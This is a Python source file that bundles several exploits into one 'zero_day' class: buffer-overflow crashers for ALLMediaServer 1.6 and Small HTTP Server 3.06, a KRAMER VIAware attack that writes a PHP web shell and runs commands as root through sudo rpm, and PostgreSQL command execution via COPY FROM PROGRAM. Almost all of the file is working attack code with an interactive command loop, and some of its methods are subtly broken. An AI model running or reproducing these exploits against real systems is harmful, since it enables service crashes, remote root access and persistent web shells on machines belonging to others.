from rich.console import Console
from rich.table import Table
from art import *

from requests.exceptions import ConnectionError
from requests.compat import urljoin, quote_plus
import requests as req

import sys, urllib3
from requests import get, post
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import psycopg2
import argparse
import hashlib
import time

import socket
 

console = Console()

class zero_day:
    def __init__(zday):
        #global
        zday.state = ""
        zday.target = ""
        zday.command = ""

        #PostgreSQL 
        zday.database = ""
        zday.user = ""
        zday.password = ""
        zday.host = ""
        zday.port = ""
        zday.timeout = 10
        zday.connection =""


#set postgreSQL
    def set_postgreSQL_target(zday):
        print("Enter target : ")
        zday.host = input()
#Set the target
    def set_target(zday):
        print("Enter target : ")
        zday.target = input()

# Description: ALLMediaServer 1.6 Remote Buffer Overflow
 
# Steps to reproduce:
# 1. - ALLMediaServer 1.6 listening on port 888 or can be changed to 878
# 2. - Run the Script from remote TCP/IP
# 3. - Mediaserver.exe Crashed
    def allmedia_buffer_overflow(zday):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        zero_day.set_target(zday)
        try:
            s.connect((zday.target, 878))
            evilbuffer = "A" *1800
            s.sendall(evilbuffer)
            data = s.recv(1024)
            s.close()
            print ("Media is Out")
        except socket.error as msg:
            print("")
            print ("Couldnt connect with Mediaserver - Crashed")
#HTTP Server buffer overflow - works only for 3.06 
    def http_server_buffer_verflow(zday):
        '''
        Small http server 3.06 remote buffer overflow
        Finds buffer overflow connection if succeded
        The website version needed is http server 3.06
        '''
        try:
            term = "A" * 1600
            evil_bulk = urljoin(zday.target,quote_plus(term))
            response = req.request(method='GET',url=evil_bulk)
            print(response.text)
        except ConnectionError as e:
            print("Crash")



#Remote Code Execution as Root on KRAMER VIAware
# CVE : CVE-2021-35064, CVE-2021-36356
# Software Link: https://www.kramerav.com/us/product/viaware

    def writeFile(zday):
        #zero_day.set_target()
        headers = {
        "Host": f"{zday.target}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Accept": "text/html, */*",
        "Accept-Language": "en-GB,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Gpc": "1",
        "Te": "trailers",
        "Connection": "close"
        }
        # write php web shell into the Apache web directory
        data = {
            "radioBtnVal":"""<?php
            if(isset($_GET['cmd']))
            {
                system($_GET['cmd']);
            }?>""",
            "associateFileName": "/var/www/html/test.php"}
        post(f"https://{zday.target}/ajaxPages/writeBrowseFilePathAjax.php", headers=headers, data=data, verify=False)

    def getResult(zday):
        # query the web shell, using rpm as sudo for root privileges
        file = get(f"https://{zday.target}/test.php?cmd=" + "sudo rpm --eval '%{lua:os.execute(\"" + zday.command + "\")}'", verify=False)
        pageText = file.text
        if len(pageText) < 1:
            result = "Command did not return a result"
        else:
            result = pageText
        return result
    
    def remote_code_execution_as_root_on_KRAMER_VIAware(zday):
        # upload malicious php
        zero_day.set_target(zday)
        zero_day.writeFile(zday)
        command = ""
        while command != "exit":
            # repeatedly query the webshell
            command = input("cmd:> ").strip()
            print(zero_day.getResult(zday))
        exit()

#PostgreSQL 9.3-11.7-RCE
# CVE: CVE-2019–9193
    def postgreSQL_rce(zday):
        try:
            print ("\r\n[+] Connecting to PostgreSQL Database on {0}:{1}".format(zday.host, zday.port))
            zday.connection = psycopg2.connect (
                database=zday.database, 
                user=zday.user, 
                password=zday.password, 
                host=zday.host, 
                port=zday.port, 
                connect_timeout=zday.timeout
            )
            print ("[+] Connection to Database established")
            
            print ("[+] Checking PostgreSQL version")
            zero_day.checkVersion(zday.connection)
    
            if(zday.command):
                zero_day.exploit(zday.connection)
            else:
                print ("[+] Add the argument -c [COMMAND] to execute a system command")
    
        except psycopg2.OperationalError as e:
            print ("\r\n[-] Connection to Database failed: \r\n{0}".format(e))
            exit()

    def checkVersion(zday):
        cursor = zday.connection.cursor()
        cursor.execute("SELECT version()")
        record = cursor.fetchall()
        cursor.close()
    
        result = zero_day.deserialize(record)
        version = float(result[(result.find("PostgreSQL")+11):(result.find("PostgreSQL")+11)+4])
    
        if (version >= 9.3 and version <= 11.7):
            print("[+] PostgreSQL {0} is likely vulnerable".format(version))
    
        else:
            print("[-] PostgreSQL {0} is not vulnerable".format(version))
            exit()

    def deserialize(record):
        result = ""
        for rec in record:
            result += rec[0]+"\r\n"
        return result
    
    def randomizeTableName():
        return ("_" + hashlib.md5(time.ctime().encode('utf-8')).hexdigest())
    
    def exploit(zday):
        cursor = zero_day.connection.cursor()
        tableName = zero_day.randomizeTableName()
        try:
            print ("[+] Creating table {0}".format(tableName))
            cursor.execute("DROP TABLE IF EXISTS {1};\
                            CREATE TABLE {1}(cmd_output text);\
                            COPY {1} FROM PROGRAM '{0}';\
                            SELECT * FROM {1};".format(zero_day.command,tableName))
    
            print ("[+] Command executed\r\n")
            
            record = cursor.fetchall()
            result = zero_day.deserialize(record)
    
            print(result)
            print ("[+] Deleting table {0}\r\n".format(tableName))
    
            cursor.execute("DROP TABLE {0};".format(tableName))
            cursor.close()
    
        except psycopg2.errors.ExternalRoutineException as e:
            print ("[-] Command failed : {0}".format(e.pgerror))
            print ("[+] Deleting table {0}\r\n".format(tableName))
            cursor = zero_day.connection.cursor()
            cursor.execute("DROP TABLE {0};".format(tableName))
            cursor.close()
    
        finally:
            exit()
if __name__ == "__main__":
    #track.init_main()
    zeroday = zero_day()
    #zeroday.remote_code_execution_as_root_on_KRAMER_VIAware()
    #zeroday.set_postgreSQL_target()
    #zeroday.postgreSQL_rce()
    zeroday.allmedia_buffer_overflow()

    #zeroday.http_server_buffer_verflow()